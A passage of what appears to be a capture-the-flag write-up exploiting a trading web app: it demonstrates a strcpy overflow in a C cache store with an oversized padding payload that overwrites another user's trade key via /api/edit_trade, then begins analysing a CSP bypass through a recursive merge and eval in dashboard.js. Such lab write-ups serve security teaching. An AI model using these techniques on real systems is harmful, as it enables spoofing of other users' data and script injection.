</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Trade copied successfully&#34;</span>,<span style="color:#e6db74">&#34;trade_id&#34;</span>:<span style="color:#e6db74">&#34;b0edd7e4-c6b8-46ea-9595-b58d5bf41617&#34;</span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Nice! Let&rsquo;s check back at the cache store:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>list
</span></span><span style="display:flex;"><span>signal:17bb0ffc-5b96-44f3-8e86-ec104e68b5df
</span></span><span style="display:flex;"><span>signal:a6598f42-8457-46ad-bf3a-b5aa2d97d0b6
</span></span><span style="display:flex;"><span>signal:24c9fd30-9a88-421e-a65b-eabb2938d457
</span></span><span style="display:flex;"><span>signal:42d56d70-1322-4f6a-b89c-c8b49986ab6f
</span></span><span style="display:flex;"><span>signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
</span></span><span style="display:flex;"><span>user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
</span></span></code></pre></div><p>We can see that copying a signal added a new &ldquo;trade&rdquo; entry with the generated <code>trade_id</code>.</p>
<p>I patched the app locally to print the admin&rsquo;s email and password on start. This allows me to debug things locally and view them from an admin&rsquo;s point of view.</p>
<p>Let&rsquo;s try to view the trade we just generated as admin:
<img src="/posts/novacore-a-never-ending-chain/empty_trades.png"></p>
<p>What? Why is it empty? Let&rsquo;s see what happens when we copy a trade as admin from the <strong>Live Signals</strong> page:
<img src="/posts/novacore-a-never-ending-chain/admin_copy_signal.png"></p>
<p>Going back to <strong>My Trades</strong>, we can see that our trade signal was copied correctly!
<img src="/posts/novacore-a-never-ending-chain/admin_trade_copied.png"></p>
<p>Let&rsquo;s see what that looks like in our cache locally:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>list
</span></span><span style="display:flex;"><span>signal:17bb0ffc-5b96-44f3-8e86-ec104e68b5df
</span></span><span style="display:flex;"><span>signal:a6598f42-8457-46ad-bf3a-b5aa2d97d0b6
</span></span><span style="display:flex;"><span>signal:24c9fd30-9a88-421e-a65b-eabb2938d457
</span></span><span style="display:flex;"><span>signal:42d56d70-1322-4f6a-b89c-c8b49986ab6f
</span></span><span style="display:flex;"><span>signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
</span></span><span style="display:flex;"><span>user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
</span></span><span style="display:flex;"><span>user:1:trade:d3c562c3-d575-45e9-922f-0ee9693d16d8
</span></span></code></pre></div><p>Aha! As we can see the admin account has <code>user_id</code> of 1. The <code>/api/trades</code> endpoint we saw earlier filtered trades based on the <code>user_id</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>user_id <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>user<span style="color:#f92672">.</span>id <span style="color:#66d9ef">if</span> g<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;user&#34;</span>) <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;sys_admin&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- redacted ---</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> key<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;user:</span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74">:trade:&#34;</span>):
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># --- redacted ---</span>
</span></span></code></pre></div><p>It turns out, because we accessed the API unconventionally via a Traefik bypass, we do not have a &ldquo;real&rdquo; user session since we bypassed the <code>token_required</code> which queried and linked us with our respective <code>user_id</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        db_session <span style="color:#f92672">=</span> Database()
</span></span><span style="display:flex;"><span>        valid, user <span style="color:#f92672">=</span> db_session<span style="color:#f92672">.</span>validate_token(token)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> valid:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Invalid API token&#34;</span>}), <span style="color:#ae81ff">401</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        g<span style="color:#f92672">.</span>user <span style="color:#f92672">=</span> user
</span></span></code></pre></div><p>So even though we have full access to the API, we are given a fallback <code>sys_admin</code> user, which cannot make requests on behalf of the bot&rsquo;s admin user which has <code>user_id</code> 1.</p>
<p>This is a bummer! How will we write trades that can poison another user&rsquo;s feed now?</p>
<p>Wait&hellip; There is still a very critical part of the application that we have not explored yet. The <code>aetherCache</code> key store!</p>
<p>Let&rsquo;s inspect <code>cache/aetherCache.c</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 1024
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define KEY_SIZE 256
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define VALUE_SIZE 256
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_ENTRIES 1000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> key[KEY_SIZE];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> value[VALUE_SIZE];
</span></span><span style="display:flex;"><span>} Entry;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Entry entries[MAX_ENTRIES];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> entry_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span></code></pre></div><p>It is very interesting that they have fixed <code>KEY_SIZE</code> and <code>VALUE_SIZE</code> equal to 256 bytes. Let&rsquo;s see how keys are set:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>key, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>value) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>entry_mutex);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> entry_count; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(entries[i].key, key) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">strcpy</span>(entries[i].value, value);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>entry_mutex);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pretty_print</span>(<span style="color:#e6db74">&#34;Updated existing key-value pair&#34;</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (entry_count <span style="color:#f92672">&lt;</span> MAX_ENTRIES) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>(entries[entry_count].key, key);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>(entries[entry_count].value, value);
</span></span><span style="display:flex;"><span>        entry_count<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>entry_mutex);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pretty_print</span>(<span style="color:#e6db74">&#34;Added new key-value pair&#34;</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>entry_mutex);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pretty_print</span>(<span style="color:#e6db74">&#34;Error: maximum number of entries reached&#34;</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Interestingly, the developer took great care to make sure <code>set</code> operations are synchronized using <code>pthread_mutex_lock</code> and <code>pthread_mutex_unlock</code>. However, a quick look at how the new value is set, we find the disastrous usage of <code>strcpy(entries[i].value, value)</code>.</p>
<p>We all know that <code>strcpy</code> is an unsafe function that does not check bounds. In this case, supplying a value larger than 256 will lead to a stack-based buffer overflow that will overwrite the key of the next entry!</p>
<p>To confirm this, let&rsquo;s try something fun:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>list
</span></span><span style="display:flex;"><span>signal:17bb0ffc-5b96-44f3-8e86-ec104e68b5df
</span></span><span style="display:flex;"><span>signal:a6598f42-8457-46ad-bf3a-b5aa2d97d0b6
</span></span><span style="display:flex;"><span>signal:24c9fd30-9a88-421e-a65b-eabb2938d457
</span></span><span style="display:flex;"><span>signal:42d56d70-1322-4f6a-b89c-c8b49986ab6f
</span></span><span style="display:flex;"><span>signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
</span></span><span style="display:flex;"><span>user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
</span></span><span style="display:flex;"><span>user:1:trade:d3c562c3-d575-45e9-922f-0ee9693d16d8
</span></span></code></pre></div><p>We know that on the stack, our two trades are placed like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// entry 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/*    key : 256 bytes    */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    val : 256 bytes    */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// entry 2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/*    key : 256 bytes    */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    val : 256 bytes    */</span>
</span></span></code></pre></div><p>Let&rsquo;s see what happens if we set the <code>user:sys_admin:trade</code> entry to a value greater than 256:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">`</span>printf A%.0s <span style="color:#f92672">{</span>0..255<span style="color:#f92672">}</span><span style="color:#e6db74">`</span>aelmo
</span></span><span style="display:flex;"><span>AAA ... x256 ... AAAaelmo
</span></span></code></pre></div><p>Then set a key to it (locally):</p>
<pre tabindex="0"><code>signal:17bb0ffc-5b96-44f3-8e86-ec104e68b5df
signal:a6598f42-8457-46ad-bf3a-b5aa2d97d0b6
signal:24c9fd30-9a88-421e-a65b-eabb2938d457
signal:42d56d70-1322-4f6a-b89c-c8b49986ab6f
signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
user:1:trade:d3c562c3-d575-45e9-922f-0ee9693d16d8

set user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617 AAA ... x256 ... AAAaelmo
STORED

list
signal:17bb0ffc-5b96-44f3-8e86-ec104e68b5df
signal:a6598f42-8457-46ad-bf3a-b5aa2d97d0b6
signal:24c9fd30-9a88-421e-a65b-eabb2938d457
signal:42d56d70-1322-4f6a-b89c-c8b49986ab6f
signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
user:sys_admin:trade:b0edd7e4-c6b8-46ea-9595-b58d5bf41617
aelmo
</code></pre><p>And this is what it looks like locally:
<img src="/posts/novacore-a-never-ending-chain/docker_local_bo.png"></p>
<p>Amazing! We&rsquo;ve successfully overwritten the key of the next entry using a buffer overflow in the cache store. This means we can spoof - or create - trades on behalf of any other user!</p>
<p>A quick review of the API shows us that this buffer overflow is exposed via the <code>edit_trade</code> function which gives us the opportunity to set the cache however we wish.</p>
<p>The function does not enforce any restrictions on the value set nor its length:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#34;/edit_trade&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@token_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_trade</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> request<span style="color:#f92672">.</span>json:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;No JSON data provided&#34;</span>}), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json
</span></span><span style="display:flex;"><span>    trade_id <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;trade_id&#34;</span>)
</span></span><span style="display:flex;"><span>    symbol <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;symbol&#34;</span>)
</span></span><span style="display:flex;"><span>    action <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;action&#34;</span>)
</span></span><span style="display:flex;"><span>    price <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;price&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> trade_id:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Trade ID is required&#34;</span>}), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (symbol <span style="color:#f92672">or</span> action <span style="color:#f92672">or</span> price):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify(
</span></span><span style="display:flex;"><span>            {<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;At least one of symbol, action, or price must be provided&#34;</span>}
</span></span><span style="display:flex;"><span>        ), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cache_session <span style="color:#f92672">=</span> AetherCacheClient()
</span></span><span style="display:flex;"><span>    user_id <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>user<span style="color:#f92672">.</span>id <span style="color:#66d9ef">if</span> g<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;user&#34;</span>) <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;sys_admin&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    trade_key <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;user:</span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74">:trade:</span><span style="color:#e6db74">{</span>trade_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    trade_data <span style="color:#f92672">=</span> cache_session<span style="color:#f92672">.</span>get(trade_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> trade_data:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Trade not found&#34;</span>}), <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parsed_trade_data <span style="color:#f92672">=</span> parse_signal_data(trade_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> symbol:
</span></span><span style="display:flex;"><span>        parsed_trade_data[<span style="color:#e6db74">&#34;symbol&#34;</span>] <span style="color:#f92672">=</span> symbol
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> action:
</span></span><span style="display:flex;"><span>        parsed_trade_data[<span style="color:#e6db74">&#34;action&#34;</span>] <span style="color:#f92672">=</span> action
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> price:
</span></span><span style="display:flex;"><span>        parsed_trade_data[<span style="color:#e6db74">&#34;price&#34;</span>] <span style="color:#f92672">=</span> price
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    updated_trade_data <span style="color:#f92672">=</span> format_signal_data(
</span></span><span style="display:flex;"><span>        parsed_trade_data[<span style="color:#e6db74">&#34;symbol&#34;</span>],
</span></span><span style="display:flex;"><span>        parsed_trade_data[<span style="color:#e6db74">&#34;action&#34;</span>],
</span></span><span style="display:flex;"><span>        parsed_trade_data[<span style="color:#e6db74">&#34;price&#34;</span>],
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    cache_session<span style="color:#f92672">.</span>set(trade_key, updated_trade_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Trade updated successfully&#34;</span>, <span style="color:#e6db74">&#34;trade_id&#34;</span>: trade_id})
</span></span></code></pre></div><p>We can supply a JSON object with either <code>symbol</code>, <code>action</code> or <code>price</code> and it will format it correctly and send a <code>set</code> command to the underlying vulnerable cache!</p>
<p>Precise exploitation of this vector will be needed when we write our script, for now it&rsquo;s enough to know that we can modify the admin account&rsquo;s trades. On to the HTML injection</p>
<h2 id="chapter-5-everybody-gets-a-clobber">Chapter 5: Everybody Gets a Clobber!<a href="#chapter-5-everybody-gets-a-clobber" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>As we saw in the last chapter, we identified a stack-based buffer overflow in the custom cache implementation. The vulnerability is exposed via the <code>/api/edit_trade</code> endpoint and allows us to control trades for any user, even ones we do not own including admin at <code>user_id</code> 1.</p>
<p>Since trades are reflected, sans-sanitization on the <strong>My Trades</strong> page, we can perform XSS! Or can we?</p>
<p>A quick look at the app shows us that it is using XSS&rsquo; top nemesis: <strong>Content Security Policy</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.before_request</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">before_request</span>():
</span></span><span style="display:flex;"><span>	g<span style="color:#f92672">.</span>nonce <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>hex()
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@web.after_request</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">apply_csp</span>(response):
</span></span><span style="display:flex;"><span>	response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;default-src &#39;self&#39;; script-src &#39;self&#39; &#39;nonce-</span><span style="color:#e6db74">{</span>g<span style="color:#f92672">.</span>nonce<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; &#39;unsafe-eval&#39;; style-src &#39;self&#39;; img-src &#39;self&#39;; font-src &#39;self&#39;; connect-src &#39;self&#39;; media-src &#39;self&#39;; object-src &#39;self&#39;&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> response
</span></span></code></pre></div><p>All sources are set to <code>self</code> while scripts require a nonce that is generated securely per request. This CSP is applied indiscriminately on all requests.</p>
<p>Let&rsquo;s see if the website&rsquo;s own Javascript, the one that already has the nonce provided to it and is allowed to run may be vulnerable. If we can inject our own JS in one of these <em>approved</em> scripts, we will essentially bypass the CSP.</p>
<p>Inspecting the site, we find a custom JS file imported in all dashboard pages:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/js/dashboard.js&#34;</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;3729df3f7380d660e87420775de5a8bc&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>Let&rsquo;s inspect it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">merge</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">source</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">attr</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">attr</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;object&#34;</span> <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">attr</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;object&#34;</span>
</span></span><span style="display:flex;"><span>      ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">attr</span>], <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">attr</span>]);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">attr</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">attr</span>];
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">target</span>;
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">startTime</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date();
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;DEMO_VERSION&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Warning: this is a demo version, contact us for full version&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">UI_DEV_MODE</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">logData</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">config</span><span style="color:#f92672">:</span> window.<span style="color:#a6e22e">currentConfig</span> <span style="color:#f92672">||</span> {},
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">userAgent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">userAgent</span>,
</span></span><span style="display:flex;"><span>      };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fetch</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">`/front_end_error/new/</span><span style="color:#e6db74">${</span>
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">LOG_LEVEL</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">attributes</span><span style="color:#f92672">?</span>.<span style="color:#66d9ef">int</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">nodeValue</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;default&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/json&#34;</span>,
</span></span><span style="display:flex;"><span>          },
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">logData</span>),
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      )
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">r</span>) =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">data</span>) =&gt; {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">logData</span>, <span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">configKeysLength</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">logData</span>.<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">evaluatedConfigSize</span> <span style="color:#f92672">=</span> eval(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">configKeysLength</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> &gt; 5 ? &#39;Large Configuration&#39; : &#39;Small Configuration&#39;`</span>
</span></span><span style="display:flex;"><span>          );
